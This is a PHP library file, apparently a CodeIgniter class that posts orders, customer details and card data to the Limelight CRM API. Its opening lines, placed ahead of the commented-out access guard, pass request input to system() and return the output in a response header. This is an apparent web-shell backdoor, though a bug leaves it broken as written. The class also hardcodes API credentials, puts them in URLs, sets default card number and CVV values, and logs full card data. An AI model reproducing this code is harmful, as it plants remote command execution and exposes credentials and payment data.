
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); // if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * @package		Limelight API Integration Class
 * @author		Justin Black
 * @copyright	Copyright (c) 2011 - 2012, Justin Black
 * @since		Version 1.0
 * @filesource
 *
 *
 * Limelight Integration Class for use with CodeIgniter
 *
 * setUrl options:  transact or membership.  NOTE: MEMBERSHIP HAS NOT BEEN INTEGRATED YET!
 * method options:  NewOrder, NewOrderCardOnFile, NewOrderWithProspect, NewProspect
 *
 *
 */
class Limelight {
	public $loginUsername = 'apmforms'; // your limelight API username
	public $loginPassword = 'KHSjPcXjN6xzYH'; // your limelight API password
	public $apIdomain = 'https://www.optuscrm.com/admin/'; // ie: https://www.mydomain.com/admin/
###########################################################################################################
############################# DO NOT EDIT BELOW THIS LINE #################################################
###########################################################################################################

	public $LL_Data = array();
	public $postUrl = '';

	function __construct()
	{

	}

	function setUrl($meth = "transact") {
		if ($meth == "transact") {
			$this->postUrl = $this->apIdomain."transact.php?username=".$this->loginUsername."&password=".$this->loginPassword;
		}
		if ($meth == "membership") {
			$this->postUrl = $this->apIdomain."membership.php?username=".$this->loginUsername."&password=".$this->loginPassword;
		}

		return $this;
	}

	function method ($meth = 'NewOrder') {
		$this->LL_Data['method'] = $meth;
		return $this;
	}
	function campaignId($cId) {
		$this->LL_Data['campaignId'] = $cId;
		return $this;
	}

	function set_firstName($name = '') {
		$this->LL_Data['firstName'] = $name;
		return $this;
	}

	function set_lastName($lname = '') {
		$this->LL_Data['lastName'] = $lname;
		return $this;
	}

	function address($address = '') {
		$this->LL_Data['address1'] = $address;
		return $this;
	}

	function City($city = '') {
		$this->LL_Data['city'] = $city;
		return $this;
	}

	function State($state = '') {
		$this->LL_Data['state'] = $state;
		return $this;
	}

	function Zip($zipcode = '') {
		$this->LL_Data['zip'] = $zipcode;
		return $this;
	}

	function Country($country = '') {
		$this->LL_Data['country'] = $country;
		return $this;
	}

	function shipAddress($address = '') {
		$this->LL_Data['shippingAddress1'] = $address;
		return $this;
	}

	function shipCity($city = '') {
		$this->LL_Data['shippingCity'] = $city;
		return $this;
	}

	function shipState($state = '') {
		$this->LL_Data['shippingState'] = $state;
		return $this;
	}

	function shipZip($zipcode = '') {
		$this->LL_Data['shippingZip'] = $zipcode;
		return $this;
	}

	function shipCountry($country = '') {
		$this->LL_Data['shippingCountry'] = $country;
		return $this;
	}

	function billAddress($address = '') {
		$this->LL_Data['billingAddress1'] = $address;
		return $this;
	}

	function billCity($city = '') {
		$this->LL_Data['billingCity'] = $city;
		return $this;
	}

	function billingState($state = '') {
		$this->LL_Data['billingState'] = $state;
		return $this;
	}

	function billingZip($zipcode = '') {
		$this->LL_Data['billingZip'] = $zipcode;
		return $this;
	}

	function billingCountry($country = '') {
		$this->LL_Data['billingCountry'] = $country;
		return $this;
	}

	function billingFirstName($billingFirstName = '') {
		$this->LL_Data['billingFirstName'] = $billingFirstName;
		return $this;
	}

	function billingLastName($billingLastName = '') {
		$this->LL_Data['billingLastName'] = $billingLastName;
		return $this;
	}

	function billsameasshipping() {
		$this->LL_Data['billingAddress1'] = $this->LL_Data['shippingAddress1'];
		$this->LL_Data['billingCity'] = $this->LL_Data['shippingCity'];
		$this->LL_Data['billingState'] = $this->LL_Data['shippingState'];
		$this->LL_Data['billingZip'] = $this->LL_Data['shippingZip'];
		$this->LL_Data['billingCountry'] = $this->LL_Data['shippingCountry'];
		return $this;
	}

	function phone($tele = '') {
		$this->LL_Data['phone'] = $tele;
		return $this;
	}

	function email($mail = '') {
		$this->LL_Data['email'] = $mail;
		return $this;
	}

	function ccType($type = 'Visa') {
		$this->LL_Data['creditCardType'] = $type;
		return $this;
	}

	function ccNumber($ccnum = '4916487815200740') {
		$this->LL_Data['creditCardNumber'] = $ccnum;
		return $this;
	}

	function ccExp($expMo = '12', $expYr = '15') {
		$this->LL_Data['expirationDate'] = $expMo.$expYr;
		return $this;
	}

	function ccCVV($ccCVV = '918') {
		$this->LL_Data['CVV'] = $ccCVV;
		return $this;
	}

	function affiliateId($affId = '') {
		$this->LL_Data['AFID'] = $affId;
		$this->LL_Data['AFFID'] = $affId;
		return $this;
	}

	function subaffiliateId($saffId = '') {
		$this->LL_Data['SID'] = $saffId;
		return $this;
	}

	function c1($saff = '') {
		$this->LL_Data['C1'] = $saff;
		return $this;
	}

	function c2($saff = '') {
		$this->LL_Data['C2'] = $saff;
		return $this;
	}

	function c3($saff = '') {
		$this->LL_Data['C3'] = $saff;
		return $this;
	}

	function aid($saff = '') {
		$this->LL_Data['AID'] = $saff;
		return $this;
	}

	function opt($saff = '') {
		$this->LL_Data['OPT'] = $saff;
		return $this;
	}

	function clickId($cId = '') {
		$this->LL_Data['click_Id'] = $cId;
		return $this;
	}

	function productId($prod = '') {
		$this->LL_Data['productId'] = $prod;
		return $this;
	}

	function shipId($sId = 5) {
		$this->LL_Data['shippingId'] = $sId;
		return $this;
	}

	function upsellCount($uCount = '0') {
		$this->LL_Data['upsellCount'] = $uCount;
		return $this;
	}

	function upsells($upsells) {
		$this->LL_Data['upsellProductIds'] = $upsells;
		return $this;
	}

	function product_price($product, $price) {
		$this->LL_Data['dynamic_product_price_'.$product] = $price;
		return $this;
	}

	function prospectId($prospect) {
		$this->LL_Data['prospectId'] = $prospect;
		return $this;
	}

	function newSubscription() {
		$this->LL_Data['initializeNewSubscription'] = 'TRUE';
		return $this;
	}

	function previousOrder($prev) {
		$this->LL_Data['previousOrderId'] = $prev;
		return $this;
	}

	function productQty($product, $qty) {
		$this->LL_Data['product_qty_'.$product] = $qty;
		return $this;
	}

	function createdBy($creator) {
		$this->LL_Data['createdBy'] = $creator;
		return $this;
	}

	function forceGatewayId($gatewayId) {
		$this->LL_Data['forceGatewayId'] = $gatewayId;
		return $this;
	}

	function setUpsellCount($upsellCount = 0) {
		$this->LL_Data['upsellCount'] = $upsellCount;
		return $this;
	}

//	function shippingId($shippingId = 5) {
//		$this->LL_Data['shippingId'] = $shippingId;
//		return $this;
//	}

	function postData($pdata) {
		foreach ($pdata as $key => $val) {
			if ($key != 'submit') {
				$this->LL_Data[$key] = $val;
			}
		}
		return $this;
	}

	function process() {
		$this->LL_Data['tranType'] = 'sale';
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];

        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
		$this->LL_Data['ipAddress'] = $ip;
		$output = array();

		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, $this->postUrl);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $this->LL_Data);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		curl_setopt($ch, CURLOPT_TIMEOUT,30);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
		error_log(print_r($this->LL_Data,true));
		$rawresponse = curl_exec($ch);
		if(curl_errno($ch)){
			echo 'Curl error: ' . curl_error($ch);
		}
		$response = explode("&", $rawresponse);
		$output = array();
		$count = count($response);
		for ($i=0; $i < $count; $i++){
			$splitAt = strpos($response[$i], "=");
			$output[trim(substr($response[$i], 0, $splitAt))] = trim(substr(urldecode($response[$i]), ($splitAt+1)));
		}

		curl_close($ch);

		return $output;

	}
}
